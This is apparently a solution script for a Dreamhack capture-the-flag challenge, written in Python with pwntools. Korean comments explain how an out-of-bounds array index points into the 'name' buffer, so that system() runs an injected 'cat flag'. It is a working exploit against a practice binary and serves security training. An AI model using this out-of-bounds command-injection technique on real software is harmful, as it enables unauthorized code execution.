from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

context.log_level = "debug"
context.arch = "i386"

# Local
p = process("./out_of_bound")
# gdb.attach(p)

# Online
"""
PORT = int(input("Port: "))
HOST = int(input("Host: "))
p = remote("host" + str(HOST) + ".dreamhack.games", PORT)
"""

elf = ELF("./out_of_bound")

payload = p32(0x804a0ac + 0x04)
# name의 주소는 0x804a0ac
# command의 주소는 0x804a060
# (변수 주소는 info var []으로 검색)
# 따라서 idx에는 0x804a0ac - 0x804a060 = 76, 76 / 4 = 19만큼
# 넣어주면 name을 가리킨다
# 그렇지만 system은 const char *, 즉 상수 문자열의 포인터 변수
# 만을 인자로 받는다
# 따라서 그냥 입력에 cat flag를 넣어주고 idx에 19를 넣어주게 되면
# "cat "부분만 system에 들어가게 된다
# 그래서 name에 [name의 주소 + 4]를 넣어주면
# command[19]는 name을 가리키고,
# system(0x804a0b0)는 곧 system([name+4])를 의미하게 된다.
# payload에 name+4의 주소와 함께 cat flag를 넣어주면 완성된다.
payload += b"cat flag"

#gdb.attach(p)

p.recvuntil("Admin name: ")
p.sendline(payload)
p.recvuntil("What do you want?: ")
p.sendline("19")

p.interactive()
